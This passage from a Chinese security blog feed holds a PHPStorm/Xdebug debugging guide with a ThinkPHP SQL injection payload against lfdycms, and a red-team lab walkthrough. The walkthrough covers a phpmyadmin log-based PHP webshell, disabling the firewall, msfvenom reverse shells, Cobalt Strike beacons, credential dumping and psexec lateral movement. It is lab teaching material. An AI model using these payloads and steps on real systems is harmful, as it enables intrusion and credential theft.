Wampserver配置</h3><p>Wampserver里面是自动集成了Xdebug插件，我们可以在php.ini文件中开启并进行配置：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/2.png" alt></p><p>把enable设置为1开启，并在下面添加一些配置信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xdebug.idekey=PhpStorm  </span><br><span class="line">xdebug.remote_enable = On  </span><br><span class="line">xdebug.remote_host=localhost  </span><br><span class="line">xdebug.remote_port=9000  </span><br><span class="line">xdebug.remote_handler=dbgp</span><br></pre></td></tr></table></figure><p>添加信息后重启Wampserver让配置信息生效。重启后可以到localhost下查看phpinfo确认是否开启了Xdebug：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/3.png" alt></p><h3 id="02-PHPStorm配置"><a href="#02-PHPStorm配置" class="headerlink" title="02 PHPStorm配置"></a>02 PHPStorm配置</h3><p>首先选择File-&gt;Settings-&gt;Languages&amp;Frame Works-&gt;Php-&gt;Servers，配置服务器信息：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/4.png" alt></p><p>其次选择 File-&gt;Settings-&gt;Languages&amp;Frame Works-&gt;Php-&gt;Debug-&gt;DBGp Proxy 配置代理信息：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/5.png" alt></p><p>最后选择 File-&gt;Settings-&gt;Languages&amp;Frame Works-&gt;Php-Debug 找到右边窗口对应的debug设置，把端口改成9000，配置内容如下图所示： </p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/6.png" alt></p><h2 id="0x02-调试过程"><a href="#0x02-调试过程" class="headerlink" title="0x02 调试过程"></a>0x02 调试过程</h2><h3 id="00-开启Xdebug-helper"><a href="#00-开启Xdebug-helper" class="headerlink" title="00 开启Xdebug helper"></a>00 开启Xdebug helper</h3><p>首先点击Xdebug helper右上角的小虫子的Debug开启Debug功能：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/7.png" alt></p><h3 id="01-代码断点"><a href="#01-代码断点" class="headerlink" title="01 代码断点"></a>01 代码断点</h3><p>打开www目录中的源代码，随便下一个断点：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/8.png" alt></p><p>然后点击右上角的Debug开关，然后运行Debug功能：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/9.png" alt></p><p>访问服务器网站，代码运行到断点位置：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/10.png" alt></p><h2 id="0x03-调试lfdycms"><a href="#0x03-调试lfdycms" class="headerlink" title="0x03 调试lfdycms"></a>0x03 调试lfdycms</h2><p>lfdycms框架基于ThinkPHP 3.2.3开发，而ThinkPHP 3.2.3中find等方法存在SQL注入漏洞：<a href="https://darkless.cn/2020/06/07/thinkphp3.2.3-sqli/#toc-heading-4，因此，可以寻找lfdycms中调用了find方法来挖掘SQL注入漏洞。通过访问下面url触发MovieController中的方法：" target="_blank" rel="noopener">https://darkless.cn/2020/06/07/thinkphp3.2.3-sqli/#toc-heading-4，因此，可以寻找lfdycms中调用了find方法来挖掘SQL注入漏洞。通过访问下面url触发MovieController中的方法：</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php/Home/Movie/index/?id[where]=0%20union%20select%201,2,database(),(select%20%20version()),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27%20-</span><br></pre></td></tr></table></figure><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/11.png" alt></p><p>可以看到id就是我们的GET参数，其值是由我们控制的注入payload，往下跟进进入detail看如何处理id变量：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/12.png" alt></p><p>可见在MovieModel中是通过ThinkPHP的find方法进行SQL查询，故存在SQL注入漏洞。</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/13.png" alt></p><p>把代码流程走完即可模板生成后即可在浏览器看到回显的数据：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/14.png" alt></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>记录进步。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PHPStorm结合Wampserver调试&quot;&gt;&lt;a href=&quot;#PHPStorm结合Wampserver调试&quot; class=&quot;headerlink&quot; title=&quot;PHPStorm结合Wampserver调试&quot;&gt;&lt;/a&gt;PHPStorm结合Wampserver
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>红队靶场评估-1</title>
    <link href="http://bai-ren-1.github.io/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/"/>
    <id>http://bai-ren-1.github.io/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/</id>
    <published>2020-12-27T04:14:24.000Z</published>
    <updated>2020-12-28T02:46:54.861Z</updated>
    
    <content type="html"><![CDATA[<h1 id="红队靶场评估-1"><a href="#红队靶场评估-1" class="headerlink" title="红队靶场评估-1"></a>红队靶场评估-1</h1><p>学习学习，记录记录。感谢红日安全团队：<a href="http://vulnstack.qiyuanxuetang.net/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/</a></p><h2 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h2><p>使用VM划分不同的网段，VMnet1：192.168.52.0/24为外网；VMnet2：192.168.72.0/24为内网：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/1-vm%E7%BD%91%E7%BB%9C.png" alt></p><p>给跳板机windows7添加多一个网络适配器，设置为以下靶场信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">windows7 - 外网ip:192.168.52.143 + 内网ip:192.168.72.110 - Web服务器</span><br><span class="line">windows server 2003 - 内网ip:192.168.72.141 - 域成员机器</span><br><span class="line">windows server 2008 - 内网ip:192.168.72.138 - 域控</span><br></pre></td></tr></table></figure><p>攻击机信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kali - 外网ip：192.168.52.128 - 渗透机</span><br></pre></td></tr></table></figure><h2 id="0x01-渗透Web服务器"><a href="#0x01-渗透Web服务器" class="headerlink" title="0x01 渗透Web服务器"></a>0x01 渗透Web服务器</h2><h3 id="00-端口扫描"><a href="#00-端口扫描" class="headerlink" title="00 端口扫描"></a>00 端口扫描</h3><p>首先使用nmap对Web服务器进行全端口扫描：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -A -n -T4 -p- <span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">143</span></span><br></pre></td></tr></table></figure><p>扫描出Web服务器的开放端口有80和3306：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/2-%E6%89%ABweb%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%8F%A3.png" alt></p><h3 id="01-目录扫描"><a href="#01-目录扫描" class="headerlink" title="01 目录扫描"></a>01 目录扫描</h3><p>首先从80端口Web服务进行渗透，使用dirsearch进行目录扫描：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ./dirsearch.py -u <span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">143</span> -e php</span><br></pre></td></tr></table></figure><p>扫描后得到几个敏感路径：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/3-%E6%89%AB%E6%8F%8Fweb%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3.png" alt></p><p>尝试在浏览器访问l.php，原来是探针文件。这样就得到了phpstudy的绝对路径等信息：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/4-web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8E%A2%E9%92%88.png" alt></p><h3 id="02-phpmyadmin写shell"><a href="#02-phpmyadmin写shell" class="headerlink" title="02 phpmyadmin写shell"></a>02 phpmyadmin写shell</h3><p>访问phpmyadmin，弱口令root/root登入后台：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/5.png" alt></p><p>使用命令查询是否开启secure_file_priv：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%secure_file%&apos;;</span><br></pre></td></tr></table></figure><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/7.png" alt></p><blockquote><p>secure_file_priv 值为 NULL，不能使用 into outfile 方式写入 shell</p></blockquote><p>转变思路，使用命令查询是否开启了日志功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%general%&apos;;</span><br></pre></td></tr></table></figure><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/6.png" alt></p><p>没有开启日志功能，我们使用下面命令开启并且指定日志文件，配合探针获取的绝对路径写入shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = on;</span><br><span class="line">show variables like &apos;%general%&apos;;</span><br><span class="line">set global general_log_file = &apos;C:/phpstudy_pro/WWW/1.php&apos;; </span><br><span class="line">select &apos;&lt;?php eval($_POST[bairen]);?&gt;&apos;;</span><br></pre></td></tr></table></figure><p>执行成功！既查询后开启了日志功能，同时指定日志文件是C:/phpstudy_pro/WWW/1.php：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/8.png" alt></p><h3 id="03-连接Webshell"><a href="#03-连接Webshell" class="headerlink" title="03 连接Webshell"></a>03 连接Webshell</h3><p>使用蚁剑连接到写入的1.php一句话，连接成功：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/9.png" alt></p><p>我们可以看到通过日志功能写的1.php虽然有其他内容，但并不影响执行eval：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/10.png" alt></p><h3 id="04-shell传递"><a href="#04-shell传递" class="headerlink" title="04 shell传递"></a>04 shell传递</h3><h4 id="001-转为CS的shell"><a href="#001-转为CS的shell" class="headerlink" title="001 转为CS的shell"></a>001 转为CS的shell</h4><p>首先在kali上启动teamserver：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver 192.168.52.128 123456</span><br></pre></td></tr></table></figure><blockquote><p>CS的Beacon时常会执行不了命令，或者beacon断开连接，此时需要重新开启teamserver。</p></blockquote><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/11.png" alt></p><p>因为都是在自己搭建的网络环境，这里直接使用kali作为客户端连接teamserver。然后开启一个http监听：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/13.png" alt></p><p>有蚁剑的shell上传很方便，所以选择生成可执行二进制文件作为我们的木马：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/12.png" alt></p><p>选择我们刚才的监听器，生成木马，保存为bairenmuma.exe：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/14.png" alt></p><p>然后我们使用蚁剑上传我们刚生成的木马。在上传之前先关闭防火墙功能，免得被Web服务器管理员所看到：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br></pre></td></tr></table></figure><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/15.png" alt></p><p>上传木马并执行，就能在CS中上线，即把蚁剑的shell转到了CS中：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/16.png" alt></p><p>其他CS上线方式可以参考：<a href="https://www.freebuf.com/articles/web/252594.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/252594.html</a></p><h4 id="002-转为MSF的shell"><a href="#002-转为MSF的shell" class="headerlink" title="002 转为MSF的shell"></a>002 转为MSF的shell</h4><p>直接使用msfconsole命令进行msf，然后使用msfvenom生成木马</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">128</span> lport=<span class="number">6666</span> -f exe&gt;bairenmsf.exe</span><br></pre></td></tr></table></figure><p>在msf中执行监听，命令如下：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">128</span></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">6666</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>使用蚁剑将msf的木马上传并且执行，就能在msf收到shell：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/17.png" alt></p><h2 id="0x02-渗透域服务器"><a href="#0x02-渗透域服务器" class="headerlink" title="0x02 渗透域服务器"></a>0x02 渗透域服务器</h2><h3 id="00-信息收集"><a href="#00-信息收集" class="headerlink" title="00 信息收集"></a>00 信息收集</h3><h4 id="001-本机信息收集"><a href="#001-本机信息收集" class="headerlink" title="001 本机信息收集"></a>001 本机信息收集</h4><p>因为不存在杀软环境所以将CS的心跳值调低为0提高效率，进入上线主机beacon执行sleep命令：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/18.png" alt></p><blockquote><p>心跳时间是指上线的服务器和cs服务器的通信时间。在cs中默认的心跳时间是60s,我们可以用sleep 命令来更改心跳时间；心跳时间很长就会响应的时间很慢，但也不能设置的很短，不让很容易会被监测到与cs通信的流量，具体多少可以根据测试环境自己来设置。上图设置后为0执行命令马上获得结果回显。</p></blockquote><p>使用CS进行本机信息收集，下面是常见的命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">查看用户名：shell whoami</span><br><span class="line">查看主机名：shell hostname</span><br><span class="line">查看用户：shell <span class="built_in">net</span> user</span><br><span class="line">查看管理员：shell <span class="built_in">net</span> localgroup administrators</span><br><span class="line">查看系统详细信息：shell systeminfo</span><br><span class="line">查看操作系统 &amp; 系统版本：shell systeminfo | <span class="built_in">findstr</span> /B /C:"OS 名称" /C:"OS 版本"</span><br><span class="line">查看操作系统 &amp; 系统版本：shell systeminfo | <span class="built_in">findstr</span> /B /C:"OS Name" /C:"OS Version"</span><br><span class="line">查询已安装的软件及版本信息：shell wmic product get name,version</span><br><span class="line">查询进程及服务：shell tasklist /svc</span><br><span class="line">查询进程及服务：shell wmic process list brief</span><br></pre></td></tr></table></figure><p>执行后就会返回结果：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/19.png" alt></p><p>系统版本信息和安装的服务等：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/20.png" alt></p><p>本机的信息收集在网上能看到很多教程，需要的话就搜索对应的命令即可。重点还是在于域的信息收集。</p><h4 id="002-域信息收集"><a href="#002-域信息收集" class="headerlink" title="002 域信息收集"></a>002 域信息收集</h4><h5 id="00-是否存在域环境"><a href="#00-是否存在域环境" class="headerlink" title="00 是否存在域环境"></a>00 是否存在域环境</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看DNS服务器：shell <span class="built_in">ipconfig</span> /all </span><br><span class="line">查看主域信息：shell <span class="built_in">net</span> view /domain</span><br><span class="line">查看时间服务器：shell <span class="built_in">net</span> <span class="built_in">time</span> /domain</span><br><span class="line">查询当前的登录域与用户信息：shell <span class="built_in">net</span> config workstation</span><br></pre></td></tr></table></figure><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/21.png" alt></p><p>上面可以看到发现DNS服务器名为god.org，继续执行命令收集更多域相关信息：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/22.png" alt></p><h5 id="01-寻找域控"><a href="#01-寻找域控" class="headerlink" title="01 寻找域控"></a>01 寻找域控</h5><p>使用下面命令定位到域控的地址：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell nslookup god.org</span><br></pre></td></tr></table></figure><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/23.png" alt></p><p>确定了内网网段中域控的ip地址是：192.168.72.138</p><h5 id="02-查询域控和用户信息"><a href="#02-查询域控和用户信息" class="headerlink" title="02 查询域控和用户信息"></a>02 查询域控和用户信息</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">查看当前域的所有用户：shell <span class="built_in">net</span> user /domain</span><br><span class="line">获取域内用户的详细信息：shell wmic useraccount get /all</span><br><span class="line">查看所有域成员计算机列表：shell <span class="built_in">net</span> group "domain computers" /domain</span><br><span class="line">查看域管理员：shell <span class="built_in">net</span> group "domain admins" /domain</span><br><span class="line">查看域控制器：shell <span class="built_in">net</span> group "domain controllers" /domain</span><br><span class="line">查看企业管理组：shell <span class="built_in">net</span> group "enterprise admins" /domain</span><br><span class="line">查看域控，升级为域控时，本地账户也成为域管：shell <span class="built_in">net</span> localgroup administrators /domain</span><br><span class="line">获取域密码信息：shell <span class="built_in">net</span> accounts /domain</span><br><span class="line">获取域信任信息 (cs里执行提示不是内部或外部命令)：shell nltest /domain_trusts</span><br></pre></td></tr></table></figure><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/24.png" alt></p><h5 id="03-提权"><a href="#03-提权" class="headerlink" title="03 提权"></a>03 提权</h5><p>在执行net user /domain时提示拒绝访问，权限不足。使用CS自带的提权进行操作：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/25.png" alt></p><p>等待一个新的shell上线即可，这里返回高权限shell使用的是svc-exe插件：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/34.png" alt></p><p>有个system就可以可以进行高权限操作了：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/26.png" alt></p><p>查询剩余的域相关信息：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/27.png" alt></p><p>下面就针对域收集到的信息进行横向探测。</p><h3 id="01-横向探测"><a href="#01-横向探测" class="headerlink" title="01 横向探测"></a>01 横向探测</h3><h4 id="001-抓取凭证和密码"><a href="#001-抓取凭证和密码" class="headerlink" title="001 抓取凭证和密码"></a>001 抓取凭证和密码</h4><p>使用net view探测域中其他机器，然后选择view中的targets即可看到域其他目标：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/28.png" alt></p><p>然后使用hashdump和logonpasswords抓取出凭证以及登录密码：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/29.png" alt></p><p>选择view中的credentials即可看到抓取的密码和凭证：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/30.png" alt></p><h4 id="002-探测主机"><a href="#002-探测主机" class="headerlink" title="002 探测主机"></a>002 探测主机</h4><h5 id="00-ping命令"><a href="#00-ping命令" class="headerlink" title="00 ping命令"></a>00 ping命令</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="keyword">for</span> /L %I <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) <span class="keyword">DO</span> @<span class="built_in">ping</span> -w <span class="number">1</span> -n <span class="number">1</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.%I | <span class="built_in">findstr</span> "TTL="</span><br></pre></td></tr></table></figure><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/31.png" alt></p><p>使用ping命令如果存活的主机就会ttl字段，我们以此进行作为判别依据，遍历ip进行主机探测。</p><h5 id="01-arp命令"><a href="#01-arp命令" class="headerlink" title="01 arp命令"></a>01 arp命令</h5><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/35.png" alt></p><p>直接了当的命令，查看局域网内的其他机器的mac信息，以此探测主机。</p><h5 id="03-lodan扫描"><a href="#03-lodan扫描" class="headerlink" title="03 lodan扫描"></a>03 lodan扫描</h5><p>使用CS的脚本管理器载入ladon的cna文件，就能在上线主机右键中使用ladon的功能：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/44.png" alt></p><p>然后将Ladon.exe和Ladon.cna放进CS目录中的third-party就可以在beacon中使用Ladon命令：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/45.png" alt></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">扫描网段内存活主机信息：Ladon <span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.<span class="number">0</span>/<span class="number">24</span> OsScan</span><br><span class="line">扫描网段内存在MS17-<span class="number">010</span>：Ladon <span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.<span class="number">0</span>/<span class="number">24</span> MS17010</span><br></pre></td></tr></table></figure><h3 id="02-横向移动"><a href="#02-横向移动" class="headerlink" title="02 横向移动"></a>02 横向移动</h3><h5 id="00-SMB-Beacon"><a href="#00-SMB-Beacon" class="headerlink" title="00 SMB Beacon"></a>00 SMB Beacon</h5><blockquote><p>SMB Beacon 使用命名管道通过父级 Beacon 进行通讯，当两个 Beacons 链接后，子 Beacon 从父 Beacon 获取到任务并发送。因为链接的 Beacons 使用 Windows 命名管道进行通信，此流量封装在 SMB 协议中，所以 SMB Beacon 相对隐蔽，绕防火墙时可能发挥奇效 。</p></blockquote><p>新增一个smb的监听器，选择payload为Beacon_SMB：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/32.png" alt></p><p>在已有的beacon中选择一个点击右键，选择Spawn：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/33.png" alt></p><p>选择后等待反弹一个子shell，其图标中会带有链接：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/36.png" alt></p><p>这就是派生的 SMB Beacon，我们可以在主Beacon上用link host连接它，或者unlink host断开它：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/37.png" alt></p><h5 id="01-psexec使用凭证登录"><a href="#01-psexec使用凭证登录" class="headerlink" title="01 psexec使用凭证登录"></a>01 psexec使用凭证登录</h5><p>前面我们抓取了现有beacon中的凭证，可以通过credentials窗口查看。接着在targets中选择非域控主机，右键选择jump中的psexec：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/38.png" alt></p><p>在弹出的窗口中选择使用 god.org 的 Administrator 的凭证信息，然后监听器选择刚才创建的 smb beacon，会话也选择对应的 smb beacon 的会话：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/39.png" alt></p><blockquote><p>复现登录失败，记得是之前修改过域服务器的登录密码，所以原来mimikatz抓取的密码是旧的无法登录。使用AD重新修改密码为hongrisec@2019重新尝试。</p></blockquote><p>成功执行psexec获取到非域控的域服务器：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/40.png" alt></p><p>验证确实控制的是windows server 2003服务器：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/41.png" alt></p><p>相同方法获取到域控的shell：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/42.png" alt></p><p>同样进入beacon执行命令验证成功：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/43.png" alt></p><h5 id="02-窃取token横向"><a href="#02-窃取token横向" class="headerlink" title="02 窃取token横向"></a>02 窃取token横向</h5><p>选择beacon右键的进程列表：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/46.png" alt></p><p>在弹出的进程列表中选择域控的进程并且窃取token：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/47.png" alt></p><p>然后使用psexec时选择使用当前token即可，执行后等待传回beacon即可：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/48.png" alt></p><blockquote><p>前面的psexec能迅速地获得域控主机的beacon是因为我们读取到了域管理员账号密码的 hash，但是一般情况下，我们是获取不到的。得学会使用其他不同的方式进行横向。</p></blockquote><h5 id="03-使用msf横向"><a href="#03-使用msf横向" class="headerlink" title="03 使用msf横向"></a>03 